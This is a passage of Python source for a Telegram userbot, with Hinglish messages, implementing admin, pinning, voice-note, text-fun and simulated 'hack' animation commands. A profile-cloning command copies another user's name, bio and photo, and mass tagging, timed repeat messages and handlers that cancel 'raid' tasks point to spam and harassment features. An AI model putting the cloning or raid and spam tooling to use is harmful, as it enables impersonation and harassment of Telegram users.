    @ubot.on(events.NewMessage(pattern=r'^\.(hack|matrix|scan|loading|boom|fbi|fuck)$', outgoing=True))
    async def quick_anim_handler(event):
        cmd = event.pattern_match.group(1)
        frames_map = {
            "hack": ["💻 `Connecting to target...`", "🔓 `Bypassing firewall... 45%`", "📂 `Dumping packets... 88%`", "✅ `Access simulated — KASHYAP USERBOT`"],
            "matrix": ["🟩 `01010110 10010110`", "🟩 `11001010 00110101`", "🟩 `SYSTEM MATRIX SYNCED`"],
            "scan": ["🔍 `Scanning open ports...`", "📡 `Checking latency & routes...`", "✅ `Scan complete.`"],
            "loading": ["⏳ `Loading modules... [██░░░░░░░░] 20%`", "⏳ `Loading modules... [██████░░░░] 60%`", "✅ `Ready!`"],
            "boom": ["💣 `Fuse lit... 3`", "💥 `Fuse lit... 2`", "🔥 `Fuse lit... 1`", "💥💥 **BOOOM!** 💥💥"],
            "fbi": ["🚨 `FBI OPEN UP` 🚨", "🚔 `PERIMETER LOCKED` 🚔", "✅ `TARGET SECURED`"],
            "fuck": ["🖕 `🖕🖕🖕`", "🔥 `🖕🖕🖕🖕🖕`", "⚡ `DONE`"],
        }
        msg = await event.edit(frames_map[cmd][0])
        for fr in frames_map[cmd][1:]:
            await asyncio.sleep(0.7)
            try:
                await msg.edit(fr)
            except Exception:
                pass

    @ubot.on(events.NewMessage(pattern=r'^\.(bruteforce|packetflood|sysbreach|pulse|countanim|glitch)\b', outgoing=True))
    async def iter_anim_handler(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        n = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
        n = max(1, min(n, 50))
        msg = await event.edit(f"⚡ `{cmd.upper()}` starting ({n} steps)...")
        for i in range(1, n + 1):
            if cmd == "glitch":
                txt = f"⚡ `GLITCH_{i}x#$_%@{random.randint(10,99)}`"
            elif cmd == "pulse":
                txt = f"💓 `PULSE [{i}/{n}]` {'♥' * ((i % 5) + 1)}"
            elif cmd == "countanim":
                txt = f"🔢 **COUNT:** `{i}` / `{n}`"
            else:
                txt = f"⚙️ `{cmd.upper()}` step `{i}/{n}`..."
            try:
                await msg.edit(txt)
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
            except Exception:
                pass
            await asyncio.sleep(0.35)
        await msg.edit(f"✅ `{cmd.upper()}` finished ({n} steps).")

    @ubot.on(events.NewMessage(pattern=r'^\.type\b', outgoing=True))
    async def type_anim_handler(event):
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            await event.edit("ℹ️ **Istemaal:** `.type [text]`")
            return
        full = parts[1].strip()
        step = max(1, len(full) // 8)
        msg = await event.edit("▌")
        for idx in range(step, len(full) + 1, step):
            try:
                await msg.edit(f"{full[:idx]}▌")
            except Exception:
                pass
            await asyncio.sleep(0.25)
        await msg.edit(full)

    # 10. GROUP, ADMIN, CLONE, RENAME/PIC, KICKME, DELME, FWD & AUTOPIN
    async def _target_entity_from_event(event):
        if event.is_reply:
            rep = await event.get_reply_message()
            if rep and rep.sender_id:
                try:
                    return await ubot.get_entity(rep.sender_id)
                except Exception:
                    return rep.sender_id
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) > 1 and parts[1].strip():
            arg = parts[1].strip().split()[0]
            try:
                peer = int(arg) if arg.lstrip("-").isdigit() else arg
                return await ubot.get_entity(peer)
            except Exception:
                return None
        return None

    @ubot.on(events.NewMessage(pattern=r'^\.(ban|unban|kick|mute|unmute)\b', outgoing=True))
    async def admin_mod_handler(event):
        cmd = event.pattern_match.group(1)
        if event.is_private:
            await event.edit("ℹ️ **Yeh command group/supergroup mein chalayein.**")
            return
        target = await _target_entity_from_event(event)
        if not target:
            await event.edit(f"ℹ️ **Istemaal:** Reply karein ya `.{cmd} @username/id` likhein.")
            return
        try:
            if cmd == "ban":
                await ubot.edit_permissions(event.chat_id, target, view_messages=False)
                await event.edit("🔨 **User ban kar diya gaya.**")
            elif cmd == "unban":
                await ubot.edit_permissions(event.chat_id, target, view_messages=True)
                await event.edit("✅ **User unban ho gaya.**")
            elif cmd == "kick":
                await ubot.kick_participant(event.chat_id, target)
                await event.edit("👢 **User kick kar diya gaya.**")
            elif cmd == "mute":
                await ubot.edit_permissions(event.chat_id, target, send_messages=False)
                await event.edit("🔇 **User mute kar diya gaya.**")
            elif cmd == "unmute":
                await ubot.edit_permissions(event.chat_id, target, send_messages=True)
                await event.edit("🔊 **User unmute ho gaya.**")
        except Exception as e:
            await event.edit(f"❌ **Admin action fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.(pin|unpin)$', outgoing=True))
    async def pin_unpin_handler(event):
        cmd = event.pattern_match.group(1)
        if not event.is_reply:
            await event.edit(f"ℹ️ **Message par reply karke `.{cmd}` likhein.**")
            return
        rep = await event.get_reply_message()
        try:
            if cmd == "pin":
                await ubot.pin_message(event.chat_id, rep.id, notify=False)
                await event.edit("📌 **Message pin kar diya gaya.**")
            else:
                await ubot.unpin_message(event.chat_id, rep.id)
                await event.edit("📍 **Message unpin kar diya gaya.**")
        except Exception as e:
            await event.edit(f"❌ **Pin/Unpin fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.del$', outgoing=True))
    async def del_msg_handler(event):
        if event.is_reply:
            rep = await event.get_reply_message()
            try:
                await rep.delete()
            except Exception:
                pass
        try:
            await event.delete()
        except Exception:
            pass

    @ubot.on(events.NewMessage(pattern=r'^\.delme$', outgoing=True))
    async def delme_msg_handler(event):
        try:
            await event.delete()
        except Exception:
            pass
        if event.is_reply:
            rep = await event.get_reply_message()
            if rep and rep.out:
                try:
                    await rep.delete()
                except Exception:
                    pass

    @ubot.on(events.NewMessage(pattern=r'^\.fwd$', outgoing=True))
    async def fwd_msg_handler(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Kisi message par reply karke `.fwd` likhein.**")
            return
        rep = await event.get_reply_message()
        try:
            await ubot.forward_messages(event.chat_id, rep)
            try:
                await event.delete()
            except Exception:
                pass
        except Exception as e:
            await event.edit(f"❌ **Forward fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.kickme$', outgoing=True))
    async def kickme_handler(event):
        if event.is_private:
            await event.edit("ℹ️ **Group/channel mein `.kickme` chalayein.**")
            return
        await event.edit("👋 **Group se leave ho raha hoon...**")
        try:
            ent = await ubot.get_entity(event.chat_id)
            await ubot(LeaveChannelRequest(channel=ent))
        except Exception as e:
            await event.edit(f"❌ **Leave fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.invite$', outgoing=True))
    async def invite_link_handler(event):
        if event.is_private:
            await event.edit("ℹ️ **Group/channel mein `.invite` chalayein.**")
            return
        try:
            exp = await ubot(ExportChatInviteRequest(peer=event.chat_id))
            await event.edit(f"🔗 **Invite Link:** {exp.link}")
        except Exception as e:
            await event.edit(f"❌ **Link nahi ban saka:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.purge\b', outgoing=True))
    async def purge_handler(event):
        parts = event.raw_text.split()
        limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 15
        limit = max(1, min(limit, 100))
        ids = []
        async for m in ubot.iter_messages(event.chat_id, limit=limit, max_id=event.id):
            ids.append(m.id)
        ids.append(event.id)
        try:
            await ubot.delete_messages(event.chat_id, ids)
        except Exception as e:
            await event.edit(f"❌ **Purge fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.clone\b', outgoing=True))
    async def clone_profile_handler(event):
        target = await _target_entity_from_event(event)
        if not target:
            await event.edit("ℹ️ **Istemaal:** Reply karein ya `.clone @username/id` likhein.")
            return
        tmp_path = None
        try:
            me = await ubot.get_me()
            full_me = await ubot(GetFullUserRequest(me.id))
            about_me = getattr(getattr(full_me, "full_user", None), "about", "") or ""
            my_photos = await ubot.get_profile_photos(me.id, limit=1)
            uploaded_my_photo = None
            if my_photos:
                tmp_me = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
                tmp_me.close()
                dl_me = await ubot.download_media(my_photos[0], file=tmp_me.name)
                if dl_me and os.path.exists(dl_me):
                    uploaded_my_photo = await ubot.upload_file(dl_me)
                try:
                    if os.path.exists(tmp_me.name):
                        os.remove(tmp_me.name)
                except Exception:
                    pass

            clone_backups[owner_id] = {
                "first_name": getattr(me, "first_name", "") or "User",
                "last_name": getattr(me, "last_name", "") or "",
                "about": about_me,
                "uploaded_photo": uploaded_my_photo,
            }

            full_t = await ubot(GetFullUserRequest(target.id))
            t_first = getattr(target, "first_name", "") or "User"
            t_last = getattr(target, "last_name", "") or ""
            t_about = (getattr(getattr(full_t, "full_user", None), "about", "") or "")[:70]

            await ubot(UpdateProfileRequest(first_name=t_first, last_name=t_last, about=t_about))

            t_photos = await ubot.get_profile_photos(target.id, limit=1)
            if t_photos:
                tmp_f = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
                tmp_f.close()
                tmp_path = tmp_f.name
                dl = await ubot.download_media(t_photos[0], file=tmp_path)
                if dl and os.path.exists(dl):
                    up_file = await ubot.upload_file(dl)
                    await ubot(UploadProfilePhotoRequest(file=up_file))

            await event.edit(f"🧬 **Profile clone ho gaya:** `{t_first}`")
        except Exception as e:
            await event.edit(f"❌ **Clone fail:** `{e}`")
        finally:
            if tmp_path and os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass

    @ubot.on(events.NewMessage(pattern=r'^\.rmclone$', outgoing=True))
    async def rmclone_profile_handler(event):
        bak = clone_backups.get(owner_id)
        if not bak:
            await event.edit("ℹ️ **Koi clone backup saved nahi hai.**")
            return
        try:
            await ubot(UpdateProfileRequest(
                first_name=bak["first_name"],
                last_name=bak["last_name"],
                about=bak["about"][:70]
            ))
            me = await ubot.get_me()
            cur_photos = await ubot.get_profile_photos(me.id, limit=1)
            if cur_photos:
                await ubot(DeletePhotosRequest(id=cur_photos))
            if bak.get("uploaded_photo"):
                await ubot(UploadProfilePhotoRequest(file=bak["uploaded_photo"]))
            await event.edit("♻️ **Original profile restore ho gaya.**")
        except Exception as e:
            await event.edit(f"❌ **Restore fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.nc\b', outgoing=True))
    async def rename_chat_handler(event):
        if event.is_private:
            await event.edit("ℹ️ **Group/channel mein `.nc <name>` chalayein.**")
            return
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            await event.edit("ℹ️ **Istemaal:** `.nc <new group name>`")
            return
        new_title = parts[1].strip()
        try:
            await ubot(EditTitleRequest(channel=event.chat_id, title=new_title))
            await event.edit(f"✏️ **Group naam badal gaya:** `{new_title}`")
        except Exception as e:
            await event.edit(f"❌ **Rename fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.setpic$', outgoing=True))
    async def set_group_pic_handler(event):
        if event.is_private:
            await event.edit("ℹ️ **Group/channel mein `.setpic` chalayein.**")
            return
        media_msg = event if event.media else (await event.get_reply_message() if event.is_reply else None)
        if not media_msg or not media_msg.media:
            await event.edit("ℹ️ **Photo ke saath `.setpic` bhejein ya photo par reply karein.**")
            return
        tmp_path = None
        try:
            tmp_f = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
            tmp_f.close()
            tmp_path = tmp_f.name
            dl = await ubot.download_media(media_msg.media, file=tmp_path)
            if not dl or not os.path.exists(dl):
                await event.edit("❌ **Photo download nahi ho saki.**")
                return
            up_file = await ubot.upload_file(dl)
            await ubot(EditPhotoRequest(channel=event.chat_id, photo=up_file))
            await event.edit("🖼️ **Group photo update ho gayi.**")
        except Exception as e:
            await event.edit(f"❌ **Setpic fail:** `{e}`")
        finally:
            if tmp_path and os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass

    @ubot.on(events.NewMessage(pattern=r'^\.autopin\b', outgoing=True))
    async def autopin_handler(event):
        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.edit("ℹ️ **Istemaal:** `.autopin on [chat_id]` ya `.autopin off [chat_id]`")
            return
        mode = parts[1].lower()
        cid = int(parts[2]) if len(parts) > 2 and parts[2].lstrip("-").isdigit() else event.chat_id
        if mode == "on":
            autopin_chats.add(cid)
            await event.edit(f"📌 **AutoPin ON (`{cid}`).**")
        elif mode == "off":
            autopin_chats.discard(cid)
            await event.edit(f"📍 **AutoPin OFF (`{cid}`).**")
        else:
            await event.edit("ℹ️ **Istemaal:** `.autopin on|off [chat_id]`")

    @ubot.on(events.NewMessage(pattern=r'^\.dmautopin\b', outgoing=True))
    async def dm_autopin_handler(event):
        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.edit("ℹ️ **Istemaal:** `.dmautopin on|off [user_id]`")
            return
        mode = parts[1].lower()
        tid = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else (event.chat_id if event.is_private else None)
        if not tid:
            await event.edit("ℹ️ **DM mein chalayein ya user_id dein.**")
            return
        if mode == "on":
            dm_autopin_targets.add(tid)
            await event.edit(f"📌 **DM AutoPin ON (`{tid}`).**")
        elif mode == "off":
            dm_autopin_targets.discard(tid)
            await event.edit(f"📍 **DM AutoPin OFF (`{tid}`).**")

    @ubot.on(events.NewMessage(incoming=True))
    async def autopin_incoming_watcher(event):
        if event.chat_id in autopin_chats or (event.is_private and event.sender_id in dm_autopin_targets):
            try:
                await ubot.pin_message(event.chat_id, event.id, notify=False)
            except Exception:
                pass

    @ubot.on(events.NewMessage(pattern=r'^\.(tagall|admins|bots|pingall)\b', outgoing=True))
    async def tag_list_handler(event):
        cmd = event.pattern_match.group(1)
        if event.is_private:
            await event.edit("ℹ️ **Group/channel mein chalayein.**")
            return
        parts = event.raw_text.split(maxsplit=1)
        extra = parts[1].strip() if len(parts) > 1 else ""
        try:
            await event.delete()
        except Exception:
            pass
        mentions = []
        filter_arg = ChannelParticipantsAdmins if cmd == "admins" else (ChannelParticipantsBots if cmd == "bots" else None)
        async for u in ubot.iter_participants(event.chat_id, filter=filter_arg, limit=80):
            if getattr(u, "deleted", False):
                continue
            name = (getattr(u, "first_name", None) or getattr(u, "username", None) or "User").strip()
            mentions.append(f"[{name}](tg://user?id={u.id})")
        if not mentions:
            await ubot.send_message(event.chat_id, "ℹ️ **Koi member list mein nahi mila.**")
            return
        for i in range(0, len(mentions), 8):
            chunk = " • ".join(mentions[i:i + 8])
            line = f"{extra}\n{chunk}" if extra else chunk
            await ubot.send_message(event.chat_id, line)
            await asyncio.sleep(0.7)

    # 11. DM (FIRST MSG + EVERY 19TH MSG), REACT, SAY30 & CONTROL
    @ubot.on(events.NewMessage(pattern=r'^\.dmblock\s+(on|off)$', outgoing=True))
    async def dmblock_cmd(event):
        mode = event.pattern_match.group(1).lower()
        dm_block_enabled[owner_id] = (mode == "on")
        await event.edit(f"🛡️ **DM Auto-Block `{mode.upper()}`.**")

    @ubot.on(events.NewMessage(pattern=r'^\.dmwelcome\s+(on|off|reset)$', outgoing=True))
    async def dmwelcome_cmd(event):
        mode = event.pattern_match.group(1).lower()
        if mode == "on":
            dm_welcome_enabled[owner_id] = True
            await event.edit("✅ **DM Auto-Welcome `ON`.**")
        elif mode == "off":
            dm_welcome_enabled[owner_id] = False
            await event.edit("🛑 **DM Auto-Welcome `OFF`.**")
        else:
            dm_welcomed_users[owner_id] = set()
            dm_msg_counts[owner_id] = {}
            await event.edit("🔄 **DM Welcome list aur message count reset ho gayi.**")

    @ubot.on(events.NewMessage(pattern=r'^\.dmcount$', outgoing=True))
    async def dmcount_cmd(event):
        if not event.is_private:
            await event.edit("ℹ️ **DM chat mein `.dmcount` chalayein.**")
            return
        cnt = dm_msg_counts.setdefault(owner_id, {}).get(event.chat_id, 0)
        await event.edit(f"💬 **Is DM user ke total messages:** `{cnt}`")

    @ubot.on(events.NewMessage(pattern=r'^\.resetdm$', outgoing=True))
    async def resetdm_cmd(event):
        if not event.is_private:
            await event.edit("ℹ️ **DM chat mein `.resetdm` chalayein.**")
            return
        dm_msg_counts.setdefault(owner_id, {})[event.chat_id] = 0
        dm_welcomed_users.setdefault(owner_id, set()).discard(event.chat_id)
        await event.edit("🔄 **Is DM user ka counter aur welcome reset ho gaya.**")

    @ubot.on(events.NewMessage(pattern=r'^\.dmmute$', outgoing=True))
    async def dmmute_cmd(event):
        if not event.is_private:
            await event.edit("ℹ️ **DM chat mein `.dmmute` chalayein.**")
            return
        dm_muted_users[owner_id].add(event.chat_id)
        await event.edit("🔇 **Is DM user ke messages auto-delete honge.**")

    @ubot.on(events.NewMessage(pattern=r'^\.undmmute$', outgoing=True))
    async def undmmute_cmd(event):
        if not event.is_private:
            await event.edit("ℹ️ **DM chat mein `.undmmute` chalayein.**")
            return
        dm_muted_users[owner_id].discard(event.chat_id)
        await event.edit("🔊 **Is DM user ka mute hata diya gaya.**")

    @ubot.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
    async def dm_incoming_handler(event):
        sid = event.sender_id
        if not sid or sid == owner_id:
            return
        if sid in dm_muted_users.get(owner_id, set()):
            try:
                await event.delete()
            except Exception:
                pass
            return
        if dm_block_enabled.get(owner_id, False):
            try:
                await ubot(BlockRequest(id=sid))
            except Exception:
                pass
            return

        user_counts = dm_msg_counts.setdefault(owner_id, {})
        current_count = user_counts.get(sid, 0) + 1
        user_counts[sid] = current_count

        if owner_id in afk_status:
            try:
                await event.reply(f"💤 **@USER ABHI OFFLINE HAI🥀 AAYENGE TO AAP KE MSG KA REPLY JARUR DENGE DM KR NE KE LIYE DHYANWAD❤️☺️:** `{afk_status[owner_id]}`")
            except Exception:
                pass

        if dm_welcome_enabled.get(owner_id, True):
            seen = dm_welcomed_users.setdefault(owner_id, set())
            if current_count % 19 == 0:
                seen.add(sid)
                try:
                    await event.reply("wolcome to my dm kaise ho")
                except Exception:
                    pass
            elif sid not in seen:
                seen.add(sid)
                try:
                    await event.reply("𝓗𝓲, 𝓫𝓪𝓽𝓲𝔂𝓮 !! 𝓴𝔂𝓪 𝓼𝓬𝓮𝓷𝓮 𝓱𝓪𝓲? 𝓑𝓲𝓷𝓪 𝓴𝓪𝓪𝓶 𝓴𝓮 𝓽𝓸 𝓴𝓸𝓲 𝔂𝓪𝓪𝓭 𝓷𝓪𝓱𝓲 𝓴𝓪𝓻𝓽𝓪 🙃")
                except Exception:
                    pass

    async def _say30_worker(key, target_chat, text):
        try:
            while True:
                await asyncio.sleep(1800)
                await ubot.send_message(target_chat, text)
        except asyncio.CancelledError:
            pass
        finally:
            interval_30m_tasks.pop(key, None)

    @ubot.on(events.NewMessage(pattern=r'^\.say30\b', outgoing=True))
    async def say30_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            await event.edit("ℹ️ **Istemaal:** `.say30 [text]`")
            return
        key = (owner_id, event.chat_id)
        if key in interval_30m_tasks:
            interval_30m_tasks[key].cancel()
        interval_30m_tasks[key] = asyncio.create_task(_say30_worker(key, event.chat_id, parts[1].strip()))
        await event.edit("⏰ **Har 30 minute baad message bhejne ka timer chalu ho gaya.**")

    @ubot.on(events.NewMessage(pattern=r'^\.stop30$', outgoing=True))
    async def stop30_cmd(event):
        key = (owner_id, event.chat_id)
        t = interval_30m_tasks.pop(key, None)
        if t:
            t.cancel()
            await event.edit("🛑 **30-minute timer band kar diya gaya.**")
        else:
            await event.edit("ℹ️ **Is chat mein koi 30-minute timer nahi chal raha.**")

    @ubot.on(events.NewMessage(pattern=r'^\.stop$', outgoing=True))
    async def stop_cmd(event):
        cid = event.chat_id
        active_raids.discard(cid)
        t = active_raid_tasks.pop(cid, None)
        if t:
            t.cancel()
        for item in [x for x in rraid_targets if x[0] == cid]:
            rraid_targets.discard(item)
        for item in [x for x in echo_targets if x[0] == cid]:
            echo_targets.discard(item)
        chup_muted_users.clear()
        await event.edit("🛑 **Is chat ki active raid/echo/chup tasks rok di gayi hain.**")

    @ubot.on(events.NewMessage(pattern=r'^\.stopall$', outgoing=True))
    async def stopall_cmd(event):
        active_raids.clear()
        for t in list(active_raid_tasks.values()):
            t.cancel()
        active_raid_tasks.clear()
        rraid_targets.clear()
        echo_targets.clear()
        chup_muted_users.clear()
        await event.edit("🛑 **Sabhi active raids aur tasks rok diye gaye hain.**")

    @ubot.on(events.NewMessage(pattern=r'^\.wipe$', outgoing=True))
    async def wipe_chat_cmd(event):
        cid = event.chat_id
        active_raids.discard(cid)
        t = active_raid_tasks.pop(cid, None)
        if t:
            t.cancel()
        for item in [x for x in rraid_targets if x[0] == cid]:
            rraid_targets.discard(item)
        for item in [x for x in echo_targets if x[0] == cid]:
            echo_targets.discard(item)
        self_reacts.pop(cid, None)
        user_react_targets.pop(cid, None)
        all_reacts.pop(cid, None)
        autopin_chats.discard(cid)
        chup_muted_users.clear()
        await event.edit("🧹 **Chat wipe complete (raids, echo, reacts, autopin, chup reset).**")

    @ubot.on(events.NewMessage(pattern=r'^\.clear$', outgoing=True))
    async def clear_cmd(event):
        await purge_handler(event)

    @ubot.on(events.NewMessage(pattern=r'^\.restart$', outgoing=True))
    async def restart_userbot_cmd(event):
        await event.edit("🔄 **Userbot session refresh ho raha hai...**")
        asyncio.create_task(start_userbot_session(session_string, owner_id))
        await asyncio.sleep(0.5)
        try:
            await ubot.disconnect()
        except Exception:
            pass

    @ubot.on(events.NewMessage(pattern=r'^\.help$', outgoing=True))
    async def ubot_help_cmd(event):
        sent_deck = await _send_bot_deck_via_ubot(event, open_extra=False)
        if not sent_deck:
            await event.edit(STATIC_COMMANDS_TEXT)

    # 12. FUN, VOICE NOTE COMMANDS (5 + 10 + 5 PACK), .VOICES, .TTS & EXTRA UTILITIES
    async def _extract_vn_text(event, raw_after_cmd):
        txt = (raw_after_cmd or "").strip()
        if not txt and event.is_reply:
            rep = await event.get_reply_message()
            txt = (rep.raw_text or "").strip() if rep else ""
        return txt

    async def _send_single_voice_note(event, text, preset_name):
        tmp_path = None
        try:
            tmp_path = await synthesize_voice_file(text, preset_name=preset_name)
            reply_to = event.reply_to_msg_id if event.is_reply else None
            if reply_to:
                await ubot.send_file(event.chat_id, tmp_path, voice_note=True, reply_to=reply_to)
            else:
                await ubot.send_file(event.chat_id, tmp_path, voice_note=True)
            try:
                await event.delete()
            except Exception:
                pass
        except Exception as e:
            await event.edit(f"❌ **Voice note fail (`{preset_name}`):** `{e}`")
        finally:
            if tmp_path and os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass

    @ubot.on(events.NewMessage(pattern=r'^\.voices$', outgoing=True))
    async def voices_list_cmd(event):
        await event.edit(VOICES_MENU_TEXT)

    @ubot.on(events.NewMessage(pattern=r'^\.tts\b', outgoing=True))
    async def multi_voice_tts_cmd(event):
        parts = event.raw_text.split(maxsplit=2)
        preset_name = "boy"
        spoken_text = ""

        if len(parts) >= 2 and parts[1].lower() in TTS_VOICE_PRESETS:
            preset_name = parts[1].lower()
            if len(parts) >= 3:
                spoken_text = parts[2].strip()
        elif len(parts) >= 2:
            spoken_text = " ".join(parts[1:]).strip()

        spoken_text = await _extract_vn_text(event, spoken_text)
        if not spoken_text:
            await event.edit(TTS_USAGE_TEXT)
            return

        await _send_single_voice_note(event, spoken_text, preset_name)

    # 5 DEDICATED VOICE NOTE COMMANDS (.vgirl, .vcute, .vvillain, .vdemon, .vrobot)
    @ubot.on(events.NewMessage(pattern=r'^\.(vgirl|vcute|vvillain|vdemon|vrobot)(?:\s+([\s\S]+))?$', outgoing=True))
    async def five_voice_note_cmds(event):
        cmd = event.pattern_match.group(1)
        preset_map = {
            "vgirl": "girl",
            "vcute": "cute",
            "vvillain": "villain",
            "vdemon": "demon",
            "vrobot": "robot",
        }
        spoken_text = await _extract_vn_text(event, event.pattern_match.group(2))
        if not spoken_text:
            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} [text]` (ya kisi message par reply karein).")
            return
        await _send_single_voice_note(event, spoken_text, preset_map[cmd])

    # 10 DEDICATED VOICE NOTE COMMANDS (.vchipmunk, .vdeep, .vghost, .vfast, .vslow, .veng, .vboy, .v5, .v10, .vn10)
    @ubot.on(events.NewMessage(pattern=r'^\.(vchipmunk|vdeep|vghost|vfast|vslow|veng|vboy)(?:\s+([\s\S]+))?$', outgoing=True))
    async def seven_more_voice_cmds(event):
        cmd = event.pattern_match.group(1)
        preset_map = {
            "vchipmunk": "chipmunk",
            "vdeep": "deep",
            "vghost": "ghost",
            "vfast": "fast",
            "vslow": "slow",
            "veng": "eng_boy",
            "vboy": "boy",
        }
        spoken_text = await _extract_vn_text(event, event.pattern_match.group(2))
        if not spoken_text:
            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} [text]` (ya kisi message par reply karein).")
            return
        await _send_single_voice_note(event, spoken_text, preset_map[cmd])

    # 5 NEW VOICE NOTE COMMANDS (.vbaby, .vold, .vhorror, .vnews + .v3 in batch handler)
    @ubot.on(events.NewMessage(pattern=r'^\.(vbaby|vold|vhorror|vnews)(?:\s+([\s\S]+))?$', outgoing=True))
    async def extra_five_voice_cmds(event):
        cmd = event.pattern_match.group(1)
        preset_map = {
            "vbaby": "baby",
            "vold": "old",
            "vhorror": "horror",
            "vnews": "news",
        }
        spoken_text = await _extract_vn_text(event, event.pattern_match.group(2))
        if not spoken_text:
            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} [text]` (ya kisi message par reply karein).")
            return
        await _send_single_voice_note(event, spoken_text, preset_map[cmd])

    @ubot.on(events.NewMessage(pattern=r'^\.(v3|v5|v10|vn10)(?:\s+([\s\S]+))?$', outgoing=True))
    async def batch_voice_note_cmds(event):
        cmd = event.pattern_match.group(1)
        spoken_text = await _extract_vn_text(event, event.pattern_match.group(2))
        if not spoken_text:
            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} [text]` (ya kisi message par reply karein).")
            return

        if cmd == "v3":
            total_notes = 3
            preset_cycle = ["villain", "cute", "robot"]
        elif cmd == "v5":
            total_notes = 5
            preset_cycle = ["villain", "demon", "girl", "cute", "robot"]
        else:
            total_notes = 10
            preset_cycle = [
                "girl", "boy", "cute", "chipmunk", "villain",
                "demon", "deep", "robot", "ghost", "fast"
            ]
        reply_to = event.reply_to_msg_id if event.is_reply else None
        try:
            await event.delete()
        except Exception:
            pass

        for idx in range(total_notes):
            p_name = preset_cycle[idx % len(preset_cycle)]
            tmp_path = None
            try:
                tmp_path = await synthesize_voice_file(spoken_text, preset_name=p_name)
                if reply_to:
                    await ubot.send_file(event.chat_id, tmp_path, voice_note=True, reply_to=reply_to)
                else:
                    await ubot.send_file(event.chat_id, tmp_path, voice_note=True)
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
            except Exception:
                break
            finally:
                if tmp_path and os.path.exists(tmp_path):
                    try:
                        os.remove(tmp_path)
                    except Exception:
                        pass
            await asyncio.sleep(0.35)

    @ubot.on(events.NewMessage(pattern=r'^\.roast$', outgoing=True))
    async def roast_cmd(event):
        txt = random.choice(ROAST_LINES)
        if event.is_reply:
            rep = await event.get_reply_message()
            await rep.reply(f"🔥 {txt}")
            try:
                await event.delete()
            except Exception:
                pass
        else:
            await event.edit(f"🔥 {txt}")

    @ubot.on(events.NewMessage(pattern=r'^\.(iq|love|toss|dice|coin|rate)\b', outgoing=True))
    async def fun_misc_cmd(event):
        cmd = event.pattern_match.group(1)
        val = random.randint(1, 100)
        if cmd == "iq":
            await event.edit(f"🧠 **IQ Score:** `{val}`")
        elif cmd == "love":
            await event.edit(f"💘 **Match Meter:** `{val}%`")
        elif cmd == "toss":
            await event.edit(f"🪙 **Toss:** `{random.choice(['Heads', 'Tails'])}`")
        elif cmd == "coin":
            await event.edit(f"🪙 **Coin:** `{random.choice(['Chit (Heads)', 'Pat (Tails)'])}`")
        elif cmd == "dice":
            await event.edit(f"🎲 **Dice:** `{random.randint(1, 6)}`")
        else:
            topic = event.raw_text.split(maxsplit=1)[1] if len(event.raw_text.split(maxsplit=1)) > 1 else "Yeh"
            await event.edit(f"⭐ **Rating for {topic}:** `{val}/100`")

    def _safe_calc(expr):
        cleaned = re.sub(r'[^0-9+\-*/().%\s]', '', expr)
        if not cleaned.strip():
            return None
        return eval(cleaned, {"__builtins__": None}, {})

    @ubot.on(events.NewMessage(pattern=r'^\.(calc|calc2)\b', outgoing=True))
    async def calc_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2:
            await event.edit("ℹ️ **Istemaal:** `.calc 25 * 4 + 10`")
            return
        try:
            res = _safe_calc(parts[1])
            await event.edit(f"🧮 **Result:** `{res}`")
        except Exception:
            await event.edit("❌ **Galat math expression.**")

    @ubot.on(events.NewMessage(pattern=r'^\.(mock|mock2|reverse|clap|vapor|trim|caps|lower|title)\b', outgoing=True))
    async def text_transform_cmd(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        src = parts[1] if len(parts) > 1 else ""
        if not src and event.is_reply:
            rep = await event.get_reply_message()
            src = (rep.raw_text or "") if rep else ""
        if not src:
            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} [text]`")
            return

        if cmd in ("mock", "mock2"):
            out = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(src))
        elif cmd == "reverse":
            out = src[::-1]
        elif cmd == "clap":
            out = " 👏 ".join(src.split())
        elif cmd == "vapor":
            out = " ".join(list(src.upper()))
        elif cmd == "trim":
            out = " ".join(src.split())
        elif cmd == "caps":
            out = src.upper()
        elif cmd == "lower":
            out = src.lower()
        else:
            out = src.title()
        await event.edit(out)

    @ubot.on(events.NewMessage(pattern=r'^\.(ship|slap|hug)$', outgoing=True))
    async def social_cmd(event):
        cmd = event.pattern_match.group(1)
        pct = random.randint(15, 100)
        if cmd == "ship":
            await event.edit(f"💞 **Ship Compatibility:** `{pct}%`")
